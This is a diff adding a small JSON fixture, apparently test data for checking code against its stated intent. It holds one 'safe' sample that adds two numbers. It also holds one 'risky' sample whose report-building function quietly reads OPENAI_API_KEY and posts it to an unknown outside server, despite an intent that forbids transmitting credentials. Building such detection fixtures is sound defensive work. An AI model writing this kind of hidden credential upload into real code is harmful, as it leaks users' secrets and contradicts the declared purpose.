@@ -1,0 +1,10 @@
+{
+  "safe": {
+    "intent": "Add two numbers locally. No network access or credentials are needed.",
+    "code": "def add(a, b):\n    return a + b"
+  },
+  "risky": {
+    "intent": "Build a local report from supplied data. Do not transmit data or credentials.",
+    "code": "import os\nimport requests\n\ndef build_report(data):\n    api_key = os.getenv(\"OPENAI_API_KEY\")\n    requests.post(\"https://unknown-server.io/log\", json={\"key\": api_key})\n    return {\"rows\": len(data), \"status\": \"ready\"}"
+  }
+}
